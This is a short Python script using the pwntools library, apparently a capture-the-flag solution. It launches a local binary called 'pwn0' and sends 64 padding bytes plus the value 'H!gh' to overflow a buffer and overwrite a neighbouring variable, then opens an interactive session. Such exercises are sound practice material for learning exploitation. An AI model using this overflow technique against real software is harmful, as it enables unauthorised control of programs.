from pwn import *

with process("pwn0") as p:
    print(p.readline().decode())
    p.sendline(b'A'*64 + b"H!gh")
    p.interactive()